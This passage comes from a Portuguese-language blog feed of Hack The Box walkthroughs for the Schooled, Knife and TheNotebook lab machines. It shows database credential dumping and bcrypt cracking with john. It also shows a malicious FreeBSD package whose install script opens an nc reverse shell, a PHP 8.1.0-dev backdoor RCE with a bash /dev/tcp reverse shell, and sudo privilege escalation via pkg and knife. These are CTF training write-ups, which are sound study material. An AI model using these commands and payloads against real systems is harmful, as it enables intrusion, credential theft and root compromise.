  <li>Senha para o banco de dados do Moodle no arquivo <code class="language-plaintext highlighter-rouge">/usr/local/www/apache24/data/moodle/config.php</code> :</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$CFG-&gt;dbtype    = 'mysqli';
$CFG-&gt;dbhost    = 'localhost';
$CFG-&gt;dbuser    = 'moodle';
$CFG-&gt;dbpass    = 'PlaybookMaster2020';
'dbport' =&gt; 3306,
</code></pre></div></div>

<p>Logo após executar a enumeração, descobri que apenas nos faltava alguns caminhos no PATH, encontrando o binário do <code class="language-plaintext highlighter-rouge">curl</code>. Este ajuste no PATH também foi necessário para executar o comando <code class="language-plaintext highlighter-rouge">mysql</code>, necessário para que pudesse realizar o dump das informações necessárias a partir do banco de dados. Esta atividade foi feita de forma não interativa, já que não consegui promover meu shell para um TTY.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>find / <span class="nt">-type</span> f 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-e</span> <span class="s2">"wget$"</span> <span class="nt">-e</span> <span class="s2">"curl$"</span> <span class="nt">-e</span> <span class="s2">"mysql$"</span>
/usr/local/bin/curl
/usr/local/bin/mysql
/usr/local/share/bash-completion/completions/wget
/usr/local/share/bash-completion/completions/curl
/usr/local/share/bash-completion/completions/mysql
/usr/local/share/zsh/site-functions/_curl
/var/mail/mysql
</code></pre></div></div>

<p>O dump das credenciais foi possível a partir do comando abaixo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>/usr/local/bin/mysql <span class="nt">-u</span> moodle <span class="nt">--password</span><span class="o">=</span>PlaybookMaster2020 <span class="nt">-e</span> <span class="s2">"use moodle; select email,username,password from mdl_user; exit"</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'student.'</span>
mysql: <span class="o">[</span>Warning] Using a password on the <span class="nb">command </span>line interface can be insecure.
ERROR 1064 <span class="o">(</span>42000<span class="o">)</span> at line 1: You have an error <span class="k">in </span>your SQL syntax<span class="p">;</span> check the manual that corresponds to your MySQL server version <span class="k">for </span>the right syntax to use near <span class="s1">'exit'</span> at line 1
email   username        password
root@localhost  guest   <span class="nv">$2y$10$u8DkSWjhZnQhBk1a0g1ug</span>.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2
jamie@staff.schooled.htb        admin   <span class="nv">$2y$10$3D</span>/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW
higgins_jane@staff.schooled.htb higgins_jane    <span class="nv">$2y$10$n9SrsMwmiU</span>.egHN60RleAOauTK2XShvjsCS0tAR6m54hR1Bba6ni2
phillips_manuel@staff.schooled.htb      phillips_manuel <span class="nv">$2y$10$ZwxEs65Q0gO8rN8zpVGU2eYDvAoVmWYYEhHBPovIHr8HZGBvEYEYG</span>
carter_lianne@staff.schooled.htb        carter_lianne   <span class="nv">$2y$10$jw</span>.KgN/SIpG2MAKvW8qdiub67JD7STqIER1VeRvAH4fs/DPF57JZe
</code></pre></div></div>

<p>Com base nos hashes, criei um arquivo no formato <code class="language-plaintext highlighter-rouge">username:hash</code> e executei o comando <code class="language-plaintext highlighter-rouge">john</code>, onde obtive a senha para o usuário <code class="language-plaintext highlighter-rouge">jamie</code> conforme output abaixo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt accounts.txt                                                                 Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts <span class="o">(</span>bcrypt <span class="o">[</span>Blowfish 32/64 X3]<span class="o">)</span>
Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 1024 <span class="k">for </span>all loaded hashes
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
<span class="o">!</span>QAZ2wsx         <span class="o">(</span>jamie<span class="o">)</span>
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session aborted
</code></pre></div></div>

<p>Com estas credenciais, consegui me logar via SSH e obter a flag no arquivo <code class="language-plaintext highlighter-rouge">user.txt</code> :smile:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jamie@Schooled:~ <span class="nv">$ </span><span class="nb">id</span> <span class="o">&amp;&amp;</span> <span class="nb">hostname</span> <span class="o">&amp;&amp;</span> <span class="nb">cat </span>user.txt
<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span>,0<span class="o">(</span>wheel<span class="o">)</span>
Schooled
&lt;redacted&gt;
</code></pre></div></div>

<h2 id="root-flag">Root Flag</h2>

<p>Antes de iniciar a enumeração, iniciei executando o comando <code class="language-plaintext highlighter-rouge">sudo -l</code> como de costume, onde pude identificar as seguintes permissões para o usuário como root:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jamie@Schooled:~ <span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
User jamie may run the following commands on Schooled:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg update
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg <span class="nb">install</span> <span class="k">*</span>
</code></pre></div></div>

<p>Verificando a página do binário <code class="language-plaintext highlighter-rouge">pkg</code> no <a href="https://gtfobins.github.io/gtfobins/pkg/">GTFOBins</a> descobri que poderia utilizá-lo para instalar um pacote malicioso, de modo a conseguir um shell reverso nesta máquina. Os passos abaixo foram executados para obter um shell como <code class="language-plaintext highlighter-rouge">root</code></p>

<ul>
  <li>Instalei o pacote <code class="language-plaintext highlighter-rouge">fpm</code> na máquina atacante, também disponivel a partir deste <a href="https://github.com/jordansissel/fpm">repositório no Github</a></li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt-get <span class="nb">install </span>ruby ruby-dev rubygems build-essential
<span class="nb">sudo </span>gem <span class="nb">install</span> <span class="nt">--no-document</span> fpm
</code></pre></div></div>

<ul>
  <li>Criei um pacote contendo o payload malicioso, no caso destinado a executar o comando para obtenção de um shell reverso</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-d</span><span class="si">)</span>
<span class="nb">echo</span> <span class="s1">'export file="/tmp/zurc"'</span> <span class="o">&gt;</span> <span class="nv">$TF</span>/x.sh
<span class="nb">echo</span> <span class="s1">'rm $file;mkfifo $file;cat $file|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;$file'</span> <span class="o">&gt;&gt;</span> <span class="nv">$TF</span>/x.sh
fpm <span class="nt">-n</span> x <span class="nt">-s</span> <span class="nb">dir</span> <span class="nt">-t</span> freebsd <span class="nt">-a</span> all <span class="nt">--before-install</span> <span class="nv">$TF</span>/x.sh <span class="nv">$TF</span>
</code></pre></div></div>

<ul>
  <li>Transferi o pacote para a máquina alvo e executei o comando <code class="language-plaintext highlighter-rouge">sudo</code> permitido, obtendo assim um shell reverso a partir da conta do <code class="language-plaintext highlighter-rouge">jamie</code>, podendo assim ler a flag de root</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jamie@Schooled:/tmp <span class="nv">$ </span>/usr/local/bin/curl http://10.10.10.10/x-1.0.txz <span class="nt">-o</span> x-1.0.txz
1.0.txz  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
100   572  100   572    0     0   4144      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:--  4144
jamie@Schooled:/tmp <span class="nv">$ </span><span class="nb">sudo </span>pkg <span class="nb">install</span> <span class="nt">-y</span> <span class="nt">--no-repo-update</span> ./x-1.0.txz
pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
pkg: Repository FreeBSD cannot be opened. <span class="s1">'pkg update'</span> required
Checking integrity... <span class="k">done</span> <span class="o">(</span>0 conflicting<span class="o">)</span>
The following 1 package<span class="o">(</span>s<span class="o">)</span> will be affected <span class="o">(</span>of 0 checked<span class="o">)</span>:

New packages to be INSTALLED:
        x: 1.0

Number of packages to be installed: 1
<span class="o">[</span>1/1] Installing x-1.0...
<span class="nb">rm</span>: /tmp/zurc: No such file or directory
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lnvp</span> 4443
listening on <span class="o">[</span>any] 4443 ...
connect to <span class="o">[</span>10.10.10.10] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.234] 16349
<span class="c"># cd /root</span>
<span class="c"># cat root.txt</span>
&lt;redacted&gt;
</code></pre></div></div>

<p>Espero que tenham gostado!</p>

<p>Vejo vocês no próximo post :smile:</p>]]></content><author><name>Davi Cruz</name></author><category term="Walkthrough" /><category term="HTB Linux" /><category term="HTB Medium" /><category term="HackTheBox" /><summary type="html"><![CDATA[Olá pessoal! A máquina desta semana será Schooled, outra máquina Linux classificada como mediana do Hack The Box, criada por TheCyberGeek.]]></summary></entry><entry><title type="html">Walktrough: HTB Knife</title><link href="https://davicruz.com/walkthrough/2021/08/htb-knife" rel="alternate" type="text/html" title="Walktrough: HTB Knife" /><published>2021-08-28T09:00:00-03:00</published><updated>2021-08-28T09:00:00-03:00</updated><id>https://davicruz.com/walkthrough/2021/08/htb-knife</id><content type="html" xml:base="https://davicruz.com/walkthrough/2021/08/htb-knife"><![CDATA[<p>Olá!</p>

<p>A máquina desta semana será <strong>Knife</strong>, outra máquina Linux classificada como fácil do <a href="https://www.hackthebox.eu/">Hack The Box</a>, criada por <a href="https://app.hackthebox.eu/users/98767">MrKN16H</a>.<!--more--></p>

<p class="notice--info">:information_source: <strong>Info</strong>: Write-ups para máquinas do Hack The Box são postados assim que as máquinas são aposentadas.</p>

<p><img src="https://i.imgur.com/3IO9vBj.png" alt="HTB Knife" class="align-center" /></p>

<p>Esta máquina foi bem simples, onde você deve prestar atenção aos detalhes (no caso do webserver vulnerável) e sempre ir pelo caminho mais simples como abusar das permissões de <code class="language-plaintext highlighter-rouge">sudo</code> que o usuário já possui.</p>

<p>Espero que gostem!</p>

<h2 id="enumeração">Enumeração</h2>

<p>Como de costume, iniciei com um scan rápido do <code class="language-plaintext highlighter-rouge">nmap</code> para verificar os serviços publicados nesta máquina:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.242
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-10 17:50 <span class="nt">-03</span>
Nmap scan report <span class="k">for </span>10.10.10.242
Host is up <span class="o">(</span>0.072s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 <span class="o">(</span>RSA<span class="o">)</span>
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>10.42 seconds
</code></pre></div></div>

<h3 id="80tcp---serviço-http">80/TCP - Serviço HTTP</h3>

<p>Acessando o website podemos ver uma simples página institucional de uma companhia do setor de saúde, conforme abaixo:</p>

<p><img src="https://i.imgur.com/oAbssxJ.png" alt="HTB Knife - HTTP Service" class="align-center" /></p>

<p>Após acessar a página, obtido algumas informações adicionais, os componentes utilizados e qual o webserver em execução com ajuda do <code class="language-plaintext highlighter-rouge">whatweb</code> e o que chamou a atenção foi o cabeçalho <code class="language-plaintext highlighter-rouge">X-Powered-By</code> que aponta para uma versão de desenvolvimento do <strong>PHP 8.1.0</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>whatweb <span class="nt">--color</span><span class="o">=</span>never <span class="nt">-a</span> 3 10.10.10.242 | <span class="nb">tee </span>whatweb.txt
http://10.10.10.242 <span class="o">[</span>200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.242], PHP[8.1.0-dev], , Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
</code></pre></div></div>

<h2 id="acesso-inicial-e-user-flag">Acesso inicial e User flag</h2>

<p>Como versões de desenvolvimento frequentemente contém vulnerabilidades, decidi buscar a respeito da mesma com <code class="language-plaintext highlighter-rouge">searchsploit</code> e encontrei uma vulnerabilidade de execução remota de código (RCE - <em>Remote Code Execution</em>) conforme listado abaixo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>searchsploit <span class="s2">"8.1.0-dev"</span>
<span class="nt">----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
 Exploit Title                                                        |  Path
<span class="nt">----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
PHP 8.1.0-dev - <span class="s1">'User-Agentt'</span> Remote Code Execution                   | php/webapps/49933.py
<span class="nt">----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
Shellcodes: No Results
</code></pre></div></div>

<p>Esta vulnerabilidade consiste em um backdoor adicionado em alguns commits por contas comprometidas no código fonte do PHP onde, sempre que um request contém o cabeçalho <code class="language-plaintext highlighter-rouge">User-Agentt: "zerodiumsystem('cmd');"</code> é enviado, seu conteúdo é interpretado e executado, neste caso o conteúdo <code class="language-plaintext highlighter-rouge">cmd</code>. O exploit disponível simula um shell de modo não interativo e, a partir dele, iniciei um shell reverso interativo com o payload <code class="language-plaintext highlighter-rouge">bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/4443 0&gt;&amp;1'</code> que nos retornou uma sessão a partir da conta do usuário <strong>james</strong>, onde encontramos o arquivo <code class="language-plaintext highlighter-rouge">user.txt</code> e foi possível ler seu conteúdo, obtendo a primeira flag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james@knife:~<span class="nv">$ </span><span class="nb">id</span> <span class="o">&amp;&amp;</span> <span class="nb">hostname
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>james<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>james<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>james<span class="o">)</span>
knife
james@knife:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
&lt;redacted&gt;
</code></pre></div></div>

<h2 id="root-flag">Root flag</h2>

<p>Como de costume, iniciei com o comando <code class="language-plaintext highlighter-rouge">sudo -l</code> e tive sorte mais uma vez, vendo o seguinte output:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james@knife:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>james on knife:
   env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User james may run the following commands on knife:
   <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/knife              
</code></pre></div></div>

<p>Realizando uma busca rápida a respeito do binário, encontrei que se trata de parte da solução de gestão de configuração <a href="https://www.chef.io/">Chef</a> e, de acordo com a página <a href="https://gtfobins.github.io/gtfobins/knife/#sudo">knife | GTFOBins</a>, poderia ser utilizada facilmente para escalar privilégio como root, conforme abaixo, nos permitindo obter a última flag :smiley:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james@knife:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/knife <span class="nt">--help</span>                                                                                 Chef Infra Client: 16.10.8

Docs: https://docs.chef.io/workstation/knife/
Patents: https://www.chef.io/patents

<span class="o">[</span>...]

james@knife:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/knife <span class="nb">exec</span> <span class="nt">-E</span> <span class="s1">'exec "/bin/sh"'</span>
<span class="c"># cat root.txt</span>
&lt;redacted&gt;
</code></pre></div></div>

<p>Espero que tenham gostado!</p>

<p>Vejo vocês no próximo post :smile:</p>]]></content><author><name>Davi Cruz</name></author><category term="Walkthrough" /><category term="HackTheBox" /><category term="HTB Easy" /><category term="HTB Linux" /><summary type="html"><![CDATA[Olá! A máquina desta semana será Knife, outra máquina Linux classificada como fácil do Hack The Box, criada por MrKN16H.]]></summary></entry><entry><title type="html">Walktrough: HTB TheNotebook</title><link href="https://davicruz.com/walkthrough/2021/07/htb-thenotebook" rel="alternate" type="text/html" title="Walktrough: HTB TheNotebook" /><published>2021-07-31T09:00:00-03:00</published><updated>2021-07-31T09:00:00-03:00</updated><id>https://davicruz.com/walkthrough/2021/07/htb-thenotebook</id><content type="html" xml:base="https://davicruz.com/walkthrough/2021/07/htb-thenotebook"><![CDATA[<p>Olá pessoal!</p>

<p>A máquina desta semana será <strong>TheNotebook</strong>, outra máquina Linux classificada como mediana do <a href="https://www.hackthebox.eu/">Hack The Box</a>, criada por <a href="https://app.hackthebox.eu/users/120514">mostwanted002</a>.<!--more--></p>

<p class="notice--info">:information_source: <strong>Info</strong>: Write-ups para máquinas do Hack The Box são postados assim que as máquinas são aposentadas.</p>

<p><img src="https://i.imgur.com/DSrrFJP.png" alt="HTB TheNotebook" class="align-center" /></p>

<p>Esta máquina foi bem interessante onde tive a oportunidade de conhecer mais sobre JWT Tokens no caminho de um acesso inicial e sobre outras técnicas para docker escaping, abusando de capabilities para obter a flag de root.</p>

<h2 id="enumeração">Enumeração</h2>

<p>Como de costume, iniciamos com um scan rápido do <code class="language-plaintext highlighter-rouge">nmap</code> para verificar quais serviços temos publicados nesta máquina</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.230                                                                                       
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-10 15:05 <span class="nt">-03</span>
Stats: 0:00:01 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>0 up<span class="o">)</span>, 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% <span class="k">done
</span>Nmap scan report <span class="k">for </span>10.10.10.230
Host is up <span class="o">(</span>0.072s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf <span class="o">(</span>RSA<span class="o">)</span>
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp    open     http    nginx 1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-server-header: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: The Notebook - Your Note Keeper
10010/tcp filtered rxapi
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>11.97 seconds
</code></pre></div></div>

<h3 id="80tcp---serviço-http">80/TCP - Serviço HTTP</h3>

<p>Acessando a página, notei que se tratava de um site HTTP simples, que utiliza o <a href="https://getbootstrap.com/">Bootstrap</a> padrão, porém nenhum link ou indício de se tratar de algum framework como WordPress ou qualquer outro tipo de CMS.</p>

<p><img src="https://i.imgur.com/kJx4QaU.png" alt="HTB TheNotebook - 80/TCP" class="align-center" /></p>

<p>O que imaginava se confirmou com a execução do <code class="language-plaintext highlighter-rouge">whatweb</code>, que listou apenas dados dos componentes já reconhecidos e servidor de apresentação, no caso o <em>Nginx</em>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>whatweb 10.10.10.230
http://10.10.10.230 <span class="o">[</span>200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.230], Title[The Notebook - Your Note Keeper], nginx[1.14.0]
</code></pre></div></div>

<p>Analisando o site com o <code class="language-plaintext highlighter-rouge">gobuster</code> encontrei as seguintes páginas da aplicação, as mesmas observadas durante uma navegação normal, conforme inspeção preliminar.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.230 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-x</span> html,txt,php <span class="nt">-t</span> 50 <span class="nt">-o</span> gobuster.txt
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:                     http://10.10.10.230
<span class="o">[</span>+] Method:                  GET
<span class="o">[</span>+] Threads:                 50
<span class="o">[</span>+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="o">[</span>+] Negative Status codes:   404
<span class="o">[</span>+] User Agent:              gobuster/3.1.0
<span class="o">[</span>+] Extensions:              html,txt,php
<span class="o">[</span>+] Timeout:                 10s
<span class="o">===============================================================</span>
2021/06/10 16:04:30 Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
/login                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1250]
/register             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1422]
/admin                <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 9]
/logout               <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 209] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.230/]

<span class="o">===============================================================</span>
2021/06/10 16:34:27 Finished
<span class="o">===============================================================</span>
</code></pre></div></div>

<p>Como não encontrei nada específico da aplicação, decidi interagir um pouco com ela enquanto inspecionava as requisições utilizando o Burp Suite, a fim de identificar alguma eventual forma de exploração.</p>

<p>Iniciei por criar uma conta, clicando no link <em>Register</em>, onde me foram solicitadas informações básicas, conforme imagem abaixo, as quais após submissão resultaram na criação da conta sem maiores problemas.</p>

<p><img src="https://i.imgur.com/e49Cij7.png" alt="HTB TheNotebook - SignUp" class="align-center" /></p>

<p>Após criada conta, fui redirecionado para uma página onde tinha a possibilidade de criar algumas notas, porém interagindo com estes recursos, não observei nenhum tipo de possibilidade de injeção, a menos que seja passível de algum tipo de <strong>SSTI</strong> (Server-Side Template Injection), uma vez que as notas são renderizadas na página.</p>

<p><img src="https://i.imgur.com/hPKhMaT.png" alt="HTB TheNotebook - Logged User" class="align-center" /></p>

<p>Analisando mais profundamente as requisições, desde o processo de criação da conta, notei que nada poderia a princípio durante o registro do usuário, porém a resposta do webserver após esta ação que me chamou atenção. Nesta resposta recebemos uma instrução <code class="language-plaintext highlighter-rouge">Set-Cookie</code> definindo um cookie chamado <code class="language-plaintext highlighter-rouge">auth</code>, que continha em seu valor uma string que se assemelhava a um <strong>Token JWT</strong>.</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">FOUND</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.14.0 (Ubuntu)</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 10 Jun 2021 20:46:42 GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">209</span>
<span class="na">Location</span><span class="p">:</span> <span class="s">http://10.10.10.230/</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Impkb2UiLCJlbWFpbCI6Impkb2VAZHVtbXkuY29tIiwiYWRtaW5fY2FwIjowfQ.Ixm8_VYcfY_WAv0L7i27vyOW15dd2UuhhlOrRaSiwVFyge6_JmC2FjUEYHNh_j4xXFjfaeUR7gkifezXjsJwz99U1zpcp0CaOI9-RWXLSTpnZvprcCCyN5seCkJHNx45-Qb5mCjGDGQbrxkrcUuV8tVcdkEpFi90BfXL6XGGxJe-Ms6YiDWK1fhpaGfKXcRyAYUGWoTs62ulrVwV5fKhH978OE17egmvNWpOL0dNpmpdoCTTKYBX1KDyyFMWJvZWkydPCNPPAaqk0pNxSwiWOYzBBErx2EBd58gpZWlBLNf5JnjyoBXdHt4JdHVcpoZsmBsAT_gxRU_uffzwxTNQN9-vrsA7tLzWuyWWt32s_8hGGrauEBSW4aPP5xRbpGclDfw2KPa7qHdVa5SApHHQrDFfpxhU2hFjvjlBtmwfjJbNHb53ZRXmz0SPRLKf6sOpX3Iswld58yBYP9xtIr3eCsdW1boCsDflfjUi9LQqsM3d_PTgGgzBLIXBQXXj82i0CzlwD3rYl3AjR7IBgBZNee5HJVdNUPYx6e_uG7WU94LUBy7WsfPfYY8VHjbuWVY1Nq3Wqhg2Sb04XmWBbtbV5C12YOu-oA7A6KrloeGOjLHkIlTsnLAj3eNhl_eo5aiLuQL3P5HrGr0K_rrniLHTCGTWX3KM4qgtI57IsbXN0Dw; Path=/</span>
<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">uuid=796e6cc3-aa50-4f87-b74f-408146886c66; Path=/</span>

<span class="cp">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;</span>
<span class="nt">&lt;title&gt;</span>Redirecting...<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;h1&gt;</span>Redirecting...<span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;p&gt;</span>You should be redirected automatically to target URL: <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/"</span><span class="nt">&gt;</span>/<span class="nt">&lt;/a&gt;</span>.  If not click the link.
</code></pre></div></div>

<p>Analisando seu conteúdo no site <a href="https://jwt.ms/">jwt.ms</a>, notei detalhes muito relevantes e que poderia nos permitir elevar nosso privilégio:</p>

<ul>
  <li>Cabeçalho <code class="language-plaintext highlighter-rouge">kid</code>, que define o caminho da chave privada em um HTTP server em execução no application server, possivelmente utilizado para assinar e validar os tokens;</li>
  <li>Payload <code class="language-plaintext highlighter-rouge">admin_cap</code>, que possivelmente contém um valor binário ou sequencial, que define o <strong>nível de privilégio</strong> do usuário, que no caso do usuário recém-criado, é 0.</li>
</ul>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"typ"</span><span class="p">:</span><span class="w"> </span><span class="s2">"JWT"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"alg"</span><span class="p">:</span><span class="w"> </span><span class="s2">"RS256"</span><span class="p">,</span><span class="w">
